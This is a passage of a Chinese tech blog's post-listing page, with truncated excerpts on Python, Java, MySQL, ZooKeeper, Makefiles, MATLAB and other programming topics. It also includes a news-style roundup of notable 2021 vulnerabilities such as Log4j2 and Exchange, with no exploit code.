# -*- coding: utf-8 -*- """ @Time: 2023/4/18 14:42 @Author: CookieYang @FileName: threadVsProcess.py @SoftWare: PyCharm @brief: 功能简介 """ import time from threading import Thread from multiprocessing import Process def f1(): # time.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b78b5469b9d44de74987fd1e7a48b4a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7e5f075cc4952f8470f0039963374ee/" rel="bookmark">
			CDA数据分析师一级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文用于记录备考CDA数据分析师一级的常错概念及考点
业务分析模型：漏斗模型、RFM 模型、客户价值模型 业务分析方法：树状结构分析法、二八分析法、四象限分析法、同期群分析法 RFM模型是衡量客户价值和客户创利能力的重要工具和手段；
R：recency最近一次消费：基于当前时点，统计用户最近一次消费时点和当前时点的时间差，
F：frequency消费频次：指定时间区间内统计用户的购买次数；
M：money指定时间区间内统计用户的消费总金额；
业务图表决策树 比较类图表 序列类图表 结构/构成类图表 描述类图表 油量表和圆环百分比进度图 柱形图和条形图 雷达图 树状图 地图和词云 折线图和面积图和柱状图 漏斗图 饼图和环形图和南丁格尔玫瑰图 堆积图和百分比堆积图 瀑布图 直方图 散点图/气泡图 主键的物理意义：表的行标识符，业务意义：表的业务记录单位 表格结构数据：可以理解为是基于excel这种传统的数据 表结构数据：可以理解为是基于BI这种数据 数据可视化报表与业务分析报告的差异：
可以用来进行用户分类的模型是：RFM模型、帕累托模型。波士顿矩阵是商品矩阵，不能用来进行用户分类 波士顿矩阵：明星类产品（销售增长率高、市场占用率高），瘦狗产品（销售增长率低、市场占用率低）、问题类产品（销售增长率高、市场占用率低）、金牛类产品（销售增长率低、市场占用率高） 常用计费方式CPM（cost per mille）按每千次曝光收费、CPS（cost per sales）按实际销售收费、CPC（cost per click）按点击次数收费
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e778c43f8fb88677aab89deeb9aeb19/" rel="bookmark">
			Python与数据可视化库Bokeh
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Python简介
Python是一门高级编程语言，具有简单易学、可读性强、可扩展性好等特点。它被广泛应用于数据分析、科学计算、机器学习、人工智能等领域，其中数据分析在Python中的应用相当广泛。
二、数据可视化
数据可视化是将复杂的数据以图形的方式展现出来，以便于人们更好地理解和发现数据背后的规律。数据可视化可以有效地帮助人们更好地理解数据，发现数据中的问题，从而做出更好的决策。
在Python中，有很多数据可视化库，常用的有Matplotlib、Seaborn、Plotly、Bokeh等。其中Bokeh是一个优秀的数据可视化库，它支持多种交互式图形类型，并具有高度的可定制性和灵活性。
三、Bokeh简介
Bokeh是一个Python交互式可视化库，它支持多种图形类型，包括折线图、散点图、柱状图、直方图、热力图、地图等。Bokeh的特点是交互式，可以支持通过鼠标悬停、缩放、平移等方式对图形进行交互操作，并且可以通过JavaScript和HTML来定制和扩展交互式功能。
Bokeh的优点在于其支持多个高级数据可视化功能，包括高级图形类型、高级交互式工具、数据绑定、主题和样式等。此外，Bokeh还支持多种数据格式和数据集成方式，可以方便地处理多种数据源，包括Pandas、NumPy、SciPy等常见的数据集成方式。
Bokeh的架构是基于BSD许可的，因此可以免费使用，并且其文档十分全面，因此非常适合初学者和经验丰富的开发人员使用。
四、Bokeh的安装
Bokeh的安装非常简单，可以通过pip命令进行安装。在Windows系统上，可以在命令行中输入以下命令来安装Bokeh：
pip install bokeh 在安装后，可以使用以下命令来验证Bokeh是否安装成功：
import bokeh print(bokeh.__version__) 如果输出该版本号，则表示已经成功安装Bokeh。
五、Bokeh的使用
Bokeh的使用非常简单，可以通过Python代码生成交互式图形。以下是一个简单的例子来生成散点图。
from bokeh.plotting import figure, show from bokeh.models import ColumnDataSource x = [1, 2, 3, 4, 5] y = [6, 7, 2, 4, 5] colors = ["red", "green", "blue", "orange", "purple"] source = ColumnDataSource(data=dict(x=x, y=y, colors=colors)) p = figure(title="Scatter Plot Example") p.circle(x='x', y='y', color='colors', size=20, source=source) show(p) 在这个例子中，我们创建了一个散点图，设置了数据源、颜色和大小，并使用show()函数将图形展示出来。当我们鼠标悬停在散点图上时，会显示对应数据的具体数值。
六、Bokeh的高级功能
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e778c43f8fb88677aab89deeb9aeb19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d472f8ec7f703a766fd8b084c0e94771/" rel="bookmark">
			Java与人工智能开发入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Java语言介绍
Java是一种跨平台编程语言，最初由Sun Microsystems公司开发，之后被Oracle收购。Java以其安全性、可靠性、高效性和简洁性而广泛使用。与其他编程语言不同，Java程序在编译时生成的是字节码，而不是机器码。这意味着Java程序可以在不同的平台上执行，只需要安装Java虚拟机即可。
Java语言主要用于Web应用程序、移动应用程序和企业级应用程序的开发，还被广泛用于游戏开发、桌面应用程序开发和嵌入式系统开发。
二、人工智能介绍
人工智能（Artificial Intelligence，AI）指的是智能计算机程序的开发和应用，这些程序能够模拟人类的智能行为和思维过程。人工智能包括机器学习、自然语言处理、计算机视觉和智能机器人等领域，它们可以执行各种任务，例如图像识别、语音识别、自然语言理解、数据分析和预测等。
三、Java与人工智能的联系
Java可以与人工智能技术结合使用，在人工智能应用程序的开发和实现中发挥重要作用。Java具有以下优点：
跨平台性：Java语言编写的应用程序可以在不同的操作系统上运行，因为Java虚拟机（JVM）在不同的平台上都可以运行。
强大的库：Java提供了许多常用的库和工具，这些库和工具可以帮助开发人员快速开发人工智能应用程序。
安全性：Java具有强大的安全性，这对于需要处理敏感信息的人工智能应用程序非常重要。
多线程：Java是一种多线程语言，可以支持并发计算，这对于执行大规模数据计算的人工智能应用程序非常重要。
易于维护：Java的代码结构清晰，易于维护。
四、Java开发人工智能应用程序的技术
以下是开发Java人工智能应用程序的一些技术。
机器学习 Java开发人工智能应用程序时最常用的技术之一是机器学习。机器学习是一种人工智能技术，它使计算机程序可以从数据中学习，并根据学习到的知识自动提高性能。Java提供了各种机器学习库，例如Weka、Apache Mahout和DeepLearning4j等。这些库可以帮助开发人员构建和训练机器学习模型，并将其应用于现有数据。
自然语言处理 自然语言处理（Natural Language Processing，NLP）是一种人工智能技术，它使计算机程序可以理解和处理人类语言。Java提供了许多NLP库，例如OpenNLP和Stanford NLP等。这些库可以帮助开发人员解析和分析文本，并执行文本分类、命名实体识别、语音识别、机器翻译和情感分析等任务。
计算机视觉 计算机视觉（Computer Vision，CV）是一种人工智能技术，它使计算机程序可以理解和处理图像和视频。Java提供了许多CV库和工具，例如OpenCV和JavaCV等。这些库和工具可以帮助开发人员分析和处理图像，例如对象检测、人脸识别和图像分类等任务。
深度学习 深度学习是一种机器学习技术，它使用人工神经网络模型来模拟人脑的神经网络，从而实现复杂的模式识别、特征提取和数据分类等任务。Java提供了许多深度学习库，例如DL4J和TensorFlow等。这些库可以帮助开发人员构建和训练深度神经网络模型，并将其应用于各种人工智能应用程序。
五、Java+人工智能实战案例
以下是一个Java+人工智能实战案例。
案例：人脸识别系统
这个案例中，我们将使用Java和OpenCV库来构建一个人脸识别系统。
步骤：
1.安装Java和OpenCV库
2.编写Java程序，用于捕捉视频和识别人脸。
3.使用OpenCV的人脸检测器来检测人脸。
4.使用OpenCV的人脸识别器来识别人脸。
5.将检测到的人脸保存到文件中。
6.使用Java程序来显示检测到的人脸。
举例，整个过程如下：
import org.opencv.core.Core; import org.opencv.core.Mat; import org.opencv.core.MatOfRect; import org.opencv.core.Rect; import org.opencv.core.Scalar; import org.opencv.imgcodecs.Imgcodecs; import org.opencv.imgproc.Imgproc; import org.opencv.objdetect.CascadeClassifier; import org.opencv.videoio.VideoCapture;
public class FaceDetection {
public static void main(String[] args) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d472f8ec7f703a766fd8b084c0e94771/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a6d3eeb4ce489d53b8b8c7a78745d3c/" rel="bookmark">
			Python桌面应用程序中的模型评估与解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、背景介绍 Python是一个非常适合进行数据分析和机器学习的编程语言，而桌面应用程序是Python的一个非常重要的应用领域。在Python桌面应用程序中，模型评估与解释是非常重要的一部分。模型评估和解释是指为了了解机器学习模型的性能和如何使用它们，需要进行一些定量和定性的评估和解释。在这篇文章中，我们将重点介绍Python桌面应用程序中的模型评估与解释方法。
二、模型评估 在机器学习中，模型评估是非常重要的一个环节，它可以帮助我们了解机器学习模型的表现如何。以下是Python桌面应用程序中常用的一些模型评估方法。
1.准确率（Accuracy） 准确率是指模型预测正确样本数与总样本数之比。在Python中，可以使用accuracy_score()函数来计算准确率：
from sklearn.metrics import accuracy_score
y_true = [0, 1, 2, 3] y_pred = [0, 1, 1, 3] accuracy = accuracy_score(y_true, y_pred) print("Accuracy: ", accuracy)
2.精确率（Precision）和召回率（Recall） 精确率是指正确预测的正例数与预测为正例的样本数之比。而召回率是指正确预测的正例数与实际正例数之比。在Python中，可以使用precision_score()和recall_score()函数来计算精确率和召回率：
from sklearn.metrics import precision_score, recall_score
y_true = [0, 1, 0, 1] y_pred = [0, 0, 1, 1] precision = precision_score(y_true, y_pred) recall = recall_score(y_true, y_pred) print("Precision: ", precision) print("Recall: ", recall)
3.F1值 F1值是精确率和召回率的调和平均数，可以综合考虑精确率和召回率的表现。在Python中，可以使用f1_score()函数来计算F1值：
from sklearn.metrics import f1_score
y_true = [0, 1, 0, 1] y_pred = [0, 0, 1, 1] f1 = f1_score(y_true, y_pred) print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a6d3eeb4ce489d53b8b8c7a78745d3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0847451f4b9b4f7c462939e286ace6b/" rel="bookmark">
			Python进大厂比赛中的编程技巧与脚本工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python 是一种流行的编程语言，它在很多大型公司中广泛使用，比如 Google、Facebook、Netflix、Amazon 等。在这些公司中，Python 通常用于数据分析、机器学习、自动化测试等领域。这些领域的工作通常需要高效的编程技巧和精良的脚本工具，因此 Python 进大厂比赛中的编程技巧和脚本工具非常重要。
一、编程技巧
充分利用 Python 的标准库 Python 的标准库是非常庞大和强大的，在大多数情况下使用标准库已经足够了。一些最常用的标准库包括：os、sys、re、datetime、time、math、random 等。熟悉这些库的使用方法可以提高程序效率和可移植性。
优化代码 优化代码可以在不改变程序逻辑的情况下提高程序运行速度。一些常见的代码优化技巧包括：使用迭代而不是递归、避免使用全局变量、避免重复计算、使用局部变量等等。
使用缓存 缓存可以提高程序的性能。Python 内置了 LRU（最近最少使用）缓存，可以使用 functools.lru_cache 装饰器来实现。使用缓存可以避免重复计算和减少函数调用。
并行计算 Python 内置了多线程和多进程模块，可以用来实现并行计算。使用多线程可以提高 CPU 密集型应用程序的性能，使用多进程可以提高 I/O 密集型应用程序的性能。
错误处理 Python 的错误处理机制非常强大，可以通过 try-except 语句捕获异常并进行处理。在编写代码时应该考虑到可能出现的异常情况，并针对每种情况编写错误处理代码。
二、脚本工具
自动化部署 自动化部署工具可以帮助开发者自动化部署和管理 Python 应用程序。常用的自动化部署工具包括 Fabric 和 Ansible。这些工具可以自动化地完成部署、更新和监控任务，从而提高开发效率和应用程序的可靠性。
数据分析工具 Python 在数据分析领域非常强大，有很多数据分析工具可供选择。一些常用的数据分析工具包括：Pandas、NumPy、Matplotlib、Scipy 等。这些工具可以帮助开发者更轻松地分析和可视化数据。
自动化测试 Python 的自动化测试工具非常强大，可以帮助开发者自动化测试应用程序的各个部分。常用的自动化测试工具包括：unittest、pytest、nose 等。这些工具可以帮助开发者更轻松地测试代码，减少人工测试的时间和劳动力。
Web 应用程序框架 Python 有很多强大的 Web 应用程序框架，可以帮助开发者更轻松地构建和部署 Web 应用程序。一些常用的 Web 应用程序框架包括：Django、Flask、Bottle 等。这些框架提供了丰富的功能和插件，可以帮助开发者更轻松地构建和部署 Web 应用程序。
包管理器 Python 的包管理器可以帮助开发者更轻松地安装、升级和卸载 Python 包。常用的包管理器包括 pip 和 conda。这些包管理器可以帮助开发者更轻松地管理 Python 包的依赖关系，并且可以方便地在不同的环境中安装和使用 Python 库。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0847451f4b9b4f7c462939e286ace6b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/763ee3eff3a98e9f17d90a176cd90a7a/" rel="bookmark">
			vue项目运行报错：# Fatal error in , line 0 # Fatal process out of m#FailureMessage Object: 000000DAC15F5A30
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决方法：
npm install -g increase-memory-limit increase-memory-limit 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6d58b17cf5ce940547d946016a0eb4b/" rel="bookmark">
			MySQL | MySQL 为什么不推荐使用JOIN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL 为什么不推荐使用JOIN MySQL 不推荐使用 JOIN 的说法是过于简化的。实际上，在某些情况下使用 JOIN 是非常有用的，但在其他情况下可能会带来性能问题、复杂性和可维护性问题以及重复数据等问题。
首先我们需要知道JOIN语句是用于将多个表中的数据进行联合起来的操作。
JOIN 本质就是各个表直接数据循环匹配,嵌套查询。也就是从主表（驱动表）中取出一条数据，遍历从表（被驱动表），将匹配到的数据放到result。以次类推，主表中的每一条记录与从表记录进行判断。
在关联查询的时候,那个表作为主表（驱动表）,那个表作为从表（被驱动表）,不是那个表在前边那个表就是主表,而是MySQL优化器决定谁是主表（除了STRAIGHT_JOIN），谁是从表，优化器会通过很多方面来决定例如索引straight_join 是内连接查询 是那个表在前边 那个表就是主表,。使用straight_join一定要慎重，因为部分情况下人为指定的执行顺序并不一定会比优化引擎要靠谱。 比如A表 inner join B表查询 create table a(f1 int,f2 int ,INDEX(f1)); create table b(f1 int,f2 int,index(f2)); 内连接 EXPLAIN select * from a inner join b on a.f1=b.f1;#b作为主表 EXPLAIN select * from a inner join b on a.f1=b.f1 where a.f1 = 1;#a作为主表 EXPLAIN select * from a inner join b on a.f1=b.f1 where b.f2 = 1;#b作为主表 在小数据量的情况下可以使用JOIN 联合查询,一旦数据量很大效率就很难保证了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6d58b17cf5ce940547d946016a0eb4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bff17f25eadb1709168ca650a6c53272/" rel="bookmark">
			ZooKeeper那些事
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. ZooKeeper 面试题？ ZooKeeper 是一个开放源码的分布式协调服务，它是集群的管理者，监视着集群 中各个节点的状态根据节点提交的反馈进行下一步合理操作。最终，将简单易用 的接口和性能高效、功能稳定的系统提供给用户。 分布式应用程序可以基于 Zookeeper 实现诸如数据发布/订阅、负载均衡、命名 服务、分布式协调/通知、集群管理、Master 选举、分布式锁和分布式队列等功能。 Zookeeper 保证了如下分布式一致性特性 ： 1、顺序一致性 2、原子性 3、单一视图 4、可靠性 5、实时性（最终一致性） 客户端的读请求可以被集群中的任意一台机器处理， 如果读请求在节点上注册了 监听器，这个监听器也是由所连接的 zookeeper 机器来处理 。对于写请求，这些 请求会同时发给其他 zookeeper 机器并且达成一致后，请求才会返回成功。因此， 随着 zookeeper 的集群机器增多，读请求的吞吐会提高但是写请求的吞吐会下降。 有序性是 zookeeper 中非常重要的一个特性，所有的更新都是全局有序的，每个 更新都有一个唯一的时间戳，这个时间戳称为 zxid（Zookeeper Transaction Id）。 而读请求只会相对于更新有序，也就是读请求的返回结果中会带有这个 zookeeper 最新的 zxid。 2. ZooKeeper 提供了什么？ 1、文件系统 2、通知机制 3. Zookeeper 文件系统 Zookeeper 提供一个多层级的节点命名空间（节点称为 znode）。与文件系统不 同的是，这些节点都可以设置关联的数据，而文件系统中只有文件节点可以存放 数据而目录节点不行。 Zookeeper 为了保证高吞吐和低延迟，在内存中维护了这个树状的目录结构， 这 种特性使得 Zookeeper 不能用于存放大量的数据，每个节点的存放数据上限为 1M 。 4. ZAB 协议？ ZAB 协议是为分布式协调服务 Zookeeper 专门设计的一种支持崩溃恢复的原子广 播协议。 ZAB 协议包括两种基本的模式： 崩溃恢复和消息广播 。 当整个 zookeeper 集群刚刚启动或者 Leader 服务器宕机、重启或者网络故障导 致不存在过半的服务器与 Leader 服务器保持正常通信时，所有进程（服务器）进 入崩溃恢复模式，首先选举产生新的 Leader 服务器，然后集群中 Follower 服务 器开始与新的 Leader 服务器进行数据同步，当集群中超过半数机器与该 Leader 服务器完成数据同步之后，退出恢复模式进入消息广播模式，Leader 服务器开始 接收客户端的事务请求生成事物提案来进行事务请求处理。 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bff17f25eadb1709168ca650a6c53272/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7aa815c90e35be4e08e0fe03710c23b6/" rel="bookmark">
			USB xHCI控制器使用总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VI行超过80字符长度提示：set colorcolumn=81
1 APL USB xHCI控制器
1.1 驱动架构
14nm Apollo Lake (Gen9, A39X0) was released in September 2016.
APL 8-port MPH xHCI控制器实际上有两个roothub，一个是roothub 2.0的，一个是roothub 3.0。因为xHCI的这个特性，在Linux内核里，如果发现了PCI或者PCIe总线上具有xHCI控制器，那么驱动会向USB Core子系统注册两个roothub控制器，一个是roothub 2.0，一个是roothub 3.0，代码参见xhci-pci.c中的xhci_pci_probe()函数。
UEFI中xHCI驱动没有使用中断方式，而是用的轮训方式。
xhci_get_endpoint_index()
ep_index = (epnum * 2) + direction - 1
ep_index = 6 means ep3in
1.2 OTG架构
寄存器地址：PCI_BAR0 + 80D8h
8-port MPH xHCI和dwc3组成一个PCI多功能设备，xHCI的func号为0，dwc3的func号为1，Synopsys dwc3 usb comes from inSilicon。由于PCI总线一般只有INTA#到INTD#的4个中断引脚，所以PCI多功能设备的func一般不会超过4个，但是共享中断除外。
/sys/bus/platform/drivers/intel_usb_dr_phy/intel_usb_dr_phy.0/mux_state
1.3 xHCI Scheduler Async Delay
Datasheet
21.1 xHCI - including OTG MUX Registers
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7aa815c90e35be4e08e0fe03710c23b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9ec632af8ce6689c201007d3b97b0df/" rel="bookmark">
			Makefile学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、Makefile的介绍
1.1 什么是Makefile
1.2 Makefile的规则与示例
二、Makefile的基本语法
2.1 通配符
2.2 假想目标
2.3 变量
三、Makefile的常用函数
3.1 字符串替换和分析函数
3.1.1 subst
3.1.2 patsubst
3.1.3 strip
3.1.4 findstring
3.1.5 filter/filterout
3.1.6 sort
3.2 文件名函数
3.2.1 dir/notdir
3.2.2 suffix 3.2.3 basename
3.2.4 addsuffix/addprefix
3.2.5 wildcard
3.3 其他函数
3.3.1 foreach
3.3.2 if
3.3.3 origin
3.3.4 shell 1.1 什么是Makefile 相信在Linux系统中经常会用到make这个命令来编译程序，而执行make命令所依赖的文件便是Makefile文件，make命令通过Makefile文件编写的内容对程序进行编译。make命令根据文件更新的时间戳来决定哪些文件需要重新编译这可以避免编译已经编译过的，没有改变的文件，从而提升编译效率。
1.2 Makefile的规则与示例 一个简单的 Makefile 文件包含一系列的“规则”，其样式如下： 目标(target)…: 依赖()… &lt;tab&gt;命令(command) 当“依赖文件”比“目标文件”更加新时，或者目标文件还没有生成时，就会执行“命令”
下面就是一个简单的Makefile文件：
hello: hello.c gcc -o hello hello.c clean: rm -f hello 在代码所在的文件夹下放入此Makefile文件，并执行make操作，便会生成目标文件hello，如下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9ec632af8ce6689c201007d3b97b0df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a917fff2faa12b3ad6a09b3c0ce41e73/" rel="bookmark">
			matlab绘图（三）绘制三维图像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、绘制三维曲线
二、绘制三维曲面
1.meshgrid函数
2.mesh和surf函数
一、绘制三维曲线 1.最基本的绘制三维曲线的函数—plot3
plot3(x1,y1,z1, 选项 1,x2,y2,z2, 选项 2,…, xn,yn,zn , 选项 n) 其中，每一组 x ， y ， z 组成一组曲线的坐标参数，选项的定义和 plot 函数相同。当 x 、 y 、 z 是同维向量时，则 x 、 y 、 z 对应元素构成一条三维曲线；当 x 、 y 、 z 是同维矩阵时，则以 x 、 y 、 z 对应列元素绘制三维曲线，曲线条数等于矩阵列数。（plot详细用法可以参考我的博客：matlab绘图（一） 例1. 绘制三维曲线
代码如下：
t=0:pi/10:10*pi;%取点 x=sin(t)+t.*cos(t); y=cos(t)-t.*sin(t); z=t;%计算x，y，z坐标 plot3(x,y,z,'Color','#4F4F2F','Linewidth',1.5); axis([-30 30 -30 30 0 35])%设置坐标范围 title('Line in 3-D Space');%标题 xlabel('X');ylabel('Y');zlabel('Z');%x，y，z轴标签 grid on;%开启网格线 绘制图形如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a917fff2faa12b3ad6a09b3c0ce41e73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32d96f014e51f15fc4f7215794506186/" rel="bookmark">
			【python练习】输出字符串的出现次数最多的前三字符，未通过检测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 输入任意一串字符串s，返回一个出现次数最多的前三个字符组成的列表，并从大到小排。
我编写的程序如下，idle里运行没问题，但是python小屋里检测出错，在这里记录一下：
from collections import Counter def main(s): a=Counter(s).most_common() b=[] #print(a) for i in range(len(a[:3])): b.append(a[i][0]) print(b) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca11ddb67739af7a5f1fb096e115ce76/" rel="bookmark">
			盘点 | 2021年十大网络安全漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		漏洞与信息化进程相伴而生，为加强网络安全防护、避免漏洞所引发的威胁，漏洞管理成为重要IT策略。2021年，因漏洞导致的各类安全事件频发，涉及经济、民生的方方面面，提高安全意识已势在必行。以下为国科云梳理的2021年十大网络安全漏洞，一起来看下吧。
一、Apache Log4j2 远程代码执行漏洞 Apache Log4j2是一个基于Java的日志记录工具，该日志框架被大量用于业务系统开发，用来记录日志信息。
Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发Log4j2组件解析缺陷，就可以实现目标服务器任意命令执行，获取目标服务器权限。
由于日志记录存在的普遍性，所以该漏洞具有危害程度高、利用难度低、影响范围大、后续影响广的特点。可以预见，未来数月甚至数年该漏洞才能得到比较全面的修补。
漏洞涉及CVE编号：CVE-2021-44228
漏洞影响版本：Apache log4j2 2.0 至 2.14.1 版本
二、QNAP NAS Roon Server套件认证绕过、命令注入漏洞 2021年6月11日，CNCERT发布《关于威联通设备2项0Day漏洞组合利用攻击的报告——RoonServer权限认证漏洞与命令注入漏洞》。报告中详细介绍了权限绕过漏洞（CVE-2021-28810）和命令注入漏洞（CVE-2021-28811）相关的细节，并指出早在2021年5月8日就已经捕获在野利用攻击。在后续和厂商的沟通中，QNAP官方于2021年6月4日重新发布修复后的应用。
在对在野攻击行为分析后确定攻击者尝试植入的载荷为eCh0raix勒索软件。该勒索软件会加密NAS上存储的文件并要求受害者通过TOR支付比特币赎金。
勒索软件通过NAS 0day传播不仅极具针对性且拥有极高的成功率。该漏洞不是第一个也不会是最后一个。
漏洞涉及CVE编号：CVE-2021-28810、CVE-2021-28811
三、Microsoft Exchange高危攻击链 2021年3月3日微软紧急发布了Exchange更新补丁，披露Exchange存在多个高危漏洞并且已被黑客作为攻击链的一部分进行利用，其中CVE-2021-26855通过服务器请求伪造绕过了Exchange Server身份验证，可以结合
CVE-2021-26858/CVE-2021-27065形成高危攻击链。相关漏洞详情如下：
CVE-2021-26855服务端请求伪造漏洞，可以绕过Exchange Server的身份验证。
CVE-2021-26858/CVE-2021-27065任意文件写入漏洞，需要身份验证。可配合CVE-2021-26855形成无需交互的高危攻击链。
漏洞涉及CVE编号：CVE-2021-26855、CVE-2021-26858、CVE-2021-27065
四、VMware vCenter Server未授权远程命令执行漏洞 Vmware vCenter Server是ESXi的控制中心，可以从单一控制点统一管理数据中心的所有xSphere主机和虚拟机。
2021年5月25日，VMware官方发布安全公告，修复了VMware vCenter Server和VMware Cloud Foundation 远程代码执行漏洞（CVE-2021-21985）和身份验证漏洞（CVE-2021-21986）。其中 CVE-2021-21985漏洞攻击复杂度低，且不需要用户交互，攻击者可利用该漏洞在目标系统上执行任意命令，从而获得目标系统的管理权限。
漏洞涉及CVE编号：CVE-2021-21985
漏洞影响版本：
Vmware vCenter Server 7.0 系列 &lt; 7.0.U2b
Vmware vCenter Server 6.7系列 &lt; 6.7.U3n
Vmware vCenter Server 6.5 系列 &lt; 6.5.U3p
Vmware Cloud Foundation 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca11ddb67739af7a5f1fb096e115ce76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d8b75822f07091295256a899a1b8798/" rel="bookmark">
			解决java.lang.StackOverflowError错误（栈溢出异常)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原因
原因1：递归导致，死循环或者无限循环调用，多个实体类之间有多对一、多对多 关系时，重写toString方法的时候一定要注意，不要两个有对应关系的实体类都重写相关联属性字段的toString方法，这样会导致一直递归重写下去，内存当然会被耗尽，导致栈溢出
造成我查你你查我，循环往复，就形成了递归，进而引起stackoverflow。
细致的检查报错信息，找出行号的重复模式。这些重复的行号代表了被递归调用的代码。仔细审查代码，理解为何递归不终止。
原因2：栈溢出错误通常是由于方法调用的递归深度过大而导致的。每当调用一个方法时，都会将方法的返回地址和局部变量等信息保存在栈中。如果递归调用没有终止条件或终止条件有误，那么每次递归调用都会在栈中保存一份新的方法调用信息，最终导致栈空间耗尽，从而触发栈溢出错误。 数据传送list集合分阶段传送要调用list.clear();方法释放掉内存解决栈溢出问题
原因3：栈的大小有点下导致，修改-Xss参数，这个参数可以在项目配置或命令行指定
确认递归实现没有问题，再去修改-Xss参数
我的错误原因是原因1，我首先是增加的-Xss参数，后来发现还是报错，后来仔细检查，才知道是产生了死循环，所以，大家一定要检查仔细了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b1d1a259dbe9f05c7dd95f47e05a5cd/" rel="bookmark">
			VS切换透明背景的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 材料准备： 1、俩个扩展插件
2、背景图片
3、安装vs单个组件.NET framework 目标包4.70以上版本
第一步，打开扩展 点击管理扩展 选择联机 搜索图中俩个插件 点击下载 然后重启VS 第二步，找到工具中的选项打开 下滑找到ClaudiaIDE 点击小三角并点击图中选项 改为图片中设置 其中将单一图片路径改为你存放背景图片的文件夹 第三步，找到工具中的主题 勾选Dark Transparency 附录：3安装vs单个组件.NET framework 目标包4.70以上版本 就欧克了！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/823276296eab178df6dc59d19b188871/" rel="bookmark">
			CorelDRAW 2023 v24.5.0.731(矢量图形设计工具)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CorelDRAW 2023是一款专业的矢量图形设计软件，由Corel公司开发。它提供了广泛的创意工具和功能，旨在满足设计师、艺术家和创意专业人士的需求。
CorelDRAW 2023具有直观的用户界面和工作流程，使用户能够轻松创建各种类型的图形设计，包括标志、海报、插图、包装设计、平面广告等等。它支持矢量绘图、页面布局、图片编辑和排版等功能，为用户提供了全面而灵活的设计工具。
该软件提供了丰富的形状绘制工具和笔刷，可以创建精确的线条、曲线和形状。它还支持文本处理功能，包括文本样式、段落格式、文字艺术效果等，使用户能够轻松处理和美化文本内容。
CorelDRAW 2023具有强大的色彩管理工具，支持各种调色板、渐变和特效，使用户能够创建丰富多样的色彩方案。此外，它还提供了图层管理、对象对齐、图形变换和液化效果等功能，以便于用户进行复杂的设计操作和编辑。
该软件还包含一系列与印刷和输出相关的功能，包括预览、输出设置和文件导出选项。用户可以轻松地准备设计作品以供打印、发布或在线共享。
